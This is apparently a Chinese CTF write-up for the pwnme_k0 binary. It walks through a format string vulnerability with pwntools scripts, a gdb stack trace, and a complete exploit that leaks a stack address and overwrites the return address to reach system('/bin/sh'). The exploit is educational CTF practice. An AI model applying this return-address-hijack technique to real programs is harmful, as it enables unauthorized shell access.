> 原文链接: https://www.anquanke.com//post/id/105989 


# 格式化字符串hijack retaddr及三个白帽-pwnme_k0 writeup


                                阅读量   
                                **127527**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/dm/1024_576_/t0182841a66b5557eb2.jpg)](https://p5.ssl.qhimg.com/dm/1024_576_/t0182841a66b5557eb2.jpg)

## 简介

hijack retaddr是利用格式化字符串漏洞来劫持返回地址到任意地址。本文通过对三个白帽-pwnme_k0的分析来具体实践这种利用方式。



## 题目链接

[https://github.com/eternalsakura/ctf_pwn/blob/master/pwnme_k0](https://github.com/eternalsakura/ctf_pwn/blob/master/pwnme_k0)



## 分析

这个题代码写的略智障。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011443f2ffecd762bf.png)<br>[![](https://p4.ssl.qhimg.com/t0170886f58f04d920b.png)](https://p4.ssl.qhimg.com/t0170886f58f04d920b.png)<br>
其实一共是从rbp-30到rbp-8这么一段空间，一共40个字节来存来存账号和密码。<br>
但是存账号是从v16到char v18[20]的前4个字节，确实是16个，但是这么写不会很怪么……<br>
密码也是，从数组的第4个字节之后开始存，最大存20个字节，一开始看还以为有溢出，碎碎念一下。<br>[![](https://p3.ssl.qhimg.com/t01ad6f5b5de46d8016.png)](https://p3.ssl.qhimg.com/t01ad6f5b5de46d8016.png)<br>
不过实际上漏洞是在打印个人信息的时候，能看到一个格式化字符串漏洞。<br>[![](https://p4.ssl.qhimg.com/t010e574f17445f9f76.png)](https://p4.ssl.qhimg.com/t010e574f17445f9f76.png)<br>
而这个&amp;a9+4实际上就是我们输入的密码。



## 利用

### <a class="reference-link" name="checksec"></a>checksec

```
sakura@ubuntu:~$ checksec pwnme_k0 
[*] '/home/sakura/pwnme_k0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### <a class="reference-link" name="vulfunc"></a>vulfunc

[![](https://p0.ssl.qhimg.com/t019eb327b902ff6e8c.png)](https://p0.ssl.qhimg.com/t019eb327b902ff6e8c.png)<br>[![](https://p1.ssl.qhimg.com/t015e5ed07a1ec75cea.png)](https://p1.ssl.qhimg.com/t015e5ed07a1ec75cea.png)<br>
这题看了下字符串，发现有可以直接利用的system(‘/bin/sh’)，所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。



### <a class="reference-link" name="%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"></a>确定偏移

首先来跟随一下程序，确定格式化串的相对偏移。<br>
写一个程序确定偏移。

```
from pwn import *
context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
gdb.attach(p,'break *0x400B39') #一开始就把gdb attach上去，然后设置好断点位置，break *0x400B39就是设置断点，然后c一下就执行到断点位置了。
p.recvuntil('Input your username(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%p'*8)
p.recvuntil('&gt;')
p.sendline('1')
p.recvuntil('&gt;')
p.sendline('3')
```

输出

```
sakura@ubuntu:~$ python offset.py
[DEBUG] PLT 0x400740 putchar
[DEBUG] PLT 0x400748 strcpy
[DEBUG] PLT 0x400750 puts
[DEBUG] PLT 0x400758 write
[DEBUG] PLT 0x400760 setbuf
[DEBUG] PLT 0x400768 system
[DEBUG] PLT 0x400770 printf
[DEBUG] PLT 0x400778 memset
[DEBUG] PLT 0x400780 read
[DEBUG] PLT 0x400788 __libc_start_main
[DEBUG] PLT 0x400790 __gmon_start__
[DEBUG] PLT 0x400798 memcpy
[DEBUG] PLT 0x4007a0 fflush
[DEBUG] PLT 0x4007a8 atol
[*] '/home/sakura/pwnme_k0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './pwnme_k0': pid 2885
[DEBUG] Wrote gdb script to '/tmp/pwnoFjEm0.gdb'
    break *0x400B39
[*] running in new terminal: /usr/bin/gdb -q  "/home/sakura/pwnme_k0" 2885 -x "/tmp/pwnoFjEm0.gdb"
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "/home/sakura/pwnme_k0" 2885 -x "/tmp/pwnoFjEm0.gdb"']
[+] Waiting for debugger: Done
[DEBUG] Received 0x127 bytes:
    '**********************************************n'
    '*                                            *n'
    '*Welcome to sangebaimao,Pwnn me and have fun!*n'
    '*                                            *n'
    '**********************************************n'
    'Register Account first!n'
    'Input your username(max lenth:20): n'
[DEBUG] Sent 0x9 bytes:
    'aaaaaaaan'
[DEBUG] Received 0x24 bytes:
    'Input your password(max lenth:20): n'
[DEBUG] Sent 0x11 bytes:
    '%p%p%p%p%p%p%p%pn'
[DEBUG] Received 0x5f bytes:
    'Register Success!!n'
    '1.Sh0w Account Infomation!n'
    '2.Ed1t Account Inf0mation!n'
    '3.QUit sangebaimao:(n'
    '&gt;'
[DEBUG] Sent 0x2 bytes:
    '1n'
[DEBUG] Received 0x9 bytes:
    'aaaaaaaan'
```

下面si只是为了跟进printf函数，个人习惯……不跟也行，只要你知道怎么数格式化串在哪，跟进去的话栈上第一个就肯定是返回地址，注意这里是64位程序，所以返回地址后跟着的就是参数7（offset 6),参数8（offset 7)…..

```
pwndbg&gt; si
0x0000000000400770 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[──────────────────────────────────REGISTERS───────────────────────────────────]
 RAX  0x0
 RBX  0x0
 RCX  0x400
 RDX  0x7f6c9f8829e0 (_IO_stdfile_1_lock) ◂— 0x0
 RDI  0x7fff8ee7f1e4 ◂— 0x7025702570257025 ('%p%p%p%p')---&gt;格式化字符串存在rdi里
 RSI  0x7f6c9faa6000 ◂— 0x6161616161616161 ('aaaaaaaa')
.....
[────────────────────────────────────DISASM────────────────────────────────────]
 ► 0x400770                      jmp    qword ptr [rip + 0x20184a]    &lt;0x7f6c9f512340&gt;
    ↓
   0x7f6c9f512340 &lt;printf&gt;       sub    rsp, 0xd8
   0x7f6c9f512347 &lt;printf+7&gt;     test   al, al
   0x7f6c9f512349 &lt;printf+9&gt;     mov    qword ptr [rsp + 0x28], rsi
   0x7f6c9f51234e &lt;printf+14&gt;    mov    qword ptr [rsp + 0x30], rdx
   0x7f6c9f512353 &lt;printf+19&gt;    mov    qword ptr [rsp + 0x38], rcx
   0x7f6c9f512358 &lt;printf+24&gt;    mov    qword ptr [rsp + 0x40], r8
   0x7f6c9f51235d &lt;printf+29&gt;    mov    qword ptr [rsp + 0x48], r9
   0x7f6c9f512362 &lt;printf+34&gt;    je     printf+91                     &lt;0x7f6c9f51239b&gt;
    ↓
   0x7f6c9f51239b &lt;printf+91&gt;    lea    rax, [rsp + 0xe0]
   0x7f6c9f5123a3 &lt;printf+99&gt;    mov    rsi, rdi
[────────────────────────────────────STACK─────────────────────────────────────]
00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址
01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 offset 6(因为格式化串是参数1，前6个参数存在寄存器里，所以这里是参数7，相对格式化串就是偏移6)
02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74 offset 7
03:0018│        0x7fff8ee7f1d0 ◂— 'aaaaaaaan' offset 8
04:0020│        0x7fff8ee7f1d8 ◂— 0xa /* 'n' */ offset 9
05:0028│ rdi-4  0x7fff8ee7f1e0 ◂— 0x7025702500000000 offset 10
06:0030│        0x7fff8ee7f1e8 ◂— '%p%p%p%p%p%pn'
07:0038│        0x7fff8ee7f1f0 ◂— 0xa70257025 /* '%p%pn' */
[──────────────────────────────────BACKTRACE───────────────────────────────────]
 ► f 0           400770
   f 1           400b3e
   f 2           400d74
   f 3           400e98
   f 4     7f6c9f4dff45 __libc_start_main+245
```

这样就找到了，偏移为10，不过0x7025702500000000被00截断了，应该用“后入式“，把地址写在后面，所以偏移应该取12



### <a class="reference-link" name="%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"></a>修改返回地址

我们知道：**虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。**

```
[────────────────────────────────────STACK─────────────────────────────────────]
00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址
01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 
02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74
```

这里的返回地址是printf的返回地址，此时rbp还没有变化，还没有进入printf，还是当前函数的rbp，则rbp指向的就是old rbp的地址。<br>
所以当前的返回地址就在rbp+8，即0x400d74。<br>
存储返回地址的内存就是0x7fff8ee7f1c8，它相对于相对于old rbp的地址就是：0x7fff8ee7f200-0x7fff8ee7f1c8=0x38。<br>
（这部分说的有点乱，先这么理解着吧……）<br>
总之用格式化串先读0x7fff8ee7f1c0地址（offset 6)，得到rbp的地址是0x7fff8ee7f200，再减去0x38就得到存储返回地址的内存地址是0x7fff8ee7f1c8。<br>
然后leak出这个地址后，就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6<br>
当函数返回的时候就getshell.<br>[![](https://p0.ssl.qhimg.com/t013bfa1b2aebe7cd76.png)](https://p0.ssl.qhimg.com/t013bfa1b2aebe7cd76.png)

```
from pwn import *
context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
gdb.attach(p,'break *0x400B39')
# gdb.attach(p,'break *0x400B3E')
p.recvuntil('Input your username(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('&gt;')
p.sendline('1')
data=p.recvuntil('&gt;')
data=data.split('n')[1]
leak_addr=hex(int(data,16)-0x38)
print leak_addr
p.sendline('3')
```



### <a class="reference-link" name="getshell"></a>getshell

这题的username我完全没用到，不过其实结合username更好用一些，不过<br>
为了练习”后入式“，我就写的麻烦一点。<br>
exp如下：

```
from pwn import *
# context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
# gdb.attach(p,'break *0x400B39')
p.recvuntil('Input your username(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('&gt;')
p.sendline('1')
data=p.recvuntil('&gt;')
data=data.split('n')[1]
leak_addr=int(data,16)-0x38
# print hex(leak_addr)
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('b'*8)
p.recvuntil('please input new password(max lenth:20):')
payload = "%2214u%12$hn"
payload += p64(leak_addr)
p.send(payload)
p.recvuntil('&gt;')
p.sendline('1')
p.interactive()
```

[![](https://p1.ssl.qhimg.com/t01338555e41d3d7c6a.png)](https://p1.ssl.qhimg.com/t01338555e41d3d7c6a.png)<br>[![](https://p1.ssl.qhimg.com/t0163c1cc45fd8aa3c1.png)](https://p1.ssl.qhimg.com/t0163c1cc45fd8aa3c1.png)



### <a class="reference-link" name="%E5%85%B6%E4%BB%96"></a>其他

在写payload的时候<br>
我一直把%2214u%12$hn数成11……然后一直GG。

```
sakura@ubuntu:~$ python -c 'print len("%2214u%12$hn")'
12
```

之所以做这道题。。是因为百度杯11月的一道pwn题和这题几乎一模一样…就拿来折腾下好了，不过那题没有system(‘/bin/sh’)可以利用。<br>
要考虑leak出来。<br>
格式化字符串大部分的利用姿势我都练到了，不过还是不够熟练，慢慢来呗~
